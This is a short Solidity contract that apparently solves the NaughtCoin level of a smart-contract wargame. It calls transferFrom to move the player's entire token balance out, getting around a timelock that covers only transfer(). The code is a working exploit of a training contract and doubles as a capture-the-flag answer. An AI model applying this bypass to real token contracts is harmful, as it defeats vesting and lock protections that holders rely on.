pragma solidity ^0.4.18;

import '../levels/NaughtCoin.sol';

contract NaughtCoinAttack {

  function attack(address _target, address _player) public {
    NaughtCoin naughtCoin = NaughtCoin(_target);
    naughtCoin.transferFrom(_player, this, naughtCoin.balanceOf(_player));
  }
}